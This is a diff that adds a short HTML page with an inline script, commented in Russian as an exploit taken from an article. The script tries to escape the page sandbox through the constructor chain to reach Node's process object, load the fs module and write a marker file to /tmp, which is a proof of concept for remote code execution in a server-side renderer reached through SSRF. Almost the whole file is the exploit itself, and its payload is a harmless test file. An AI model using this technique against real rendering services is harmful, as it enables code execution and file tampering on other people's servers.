@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Эксплойт из статьи — пытаемся получить доступ к process через страницу
+async function exploit() {
+  try {
+    // Пытаемся получить доступ к process через прототип
+    const processObj = window.constructor.constructor('return process')();
+    const fs = processObj.mainModule.require('fs');
+    const result = fs.writeFileSync('/tmp/rce_test.txt', 'RCE via SSRF!', 'utf8');
+    alert('File written: /tmp/rce_test.txt');
+  } catch(e) {
+    alert('Exploit failed: ' + e);
+  }
+}
+exploit();
+</script>
+</body>
+</html>
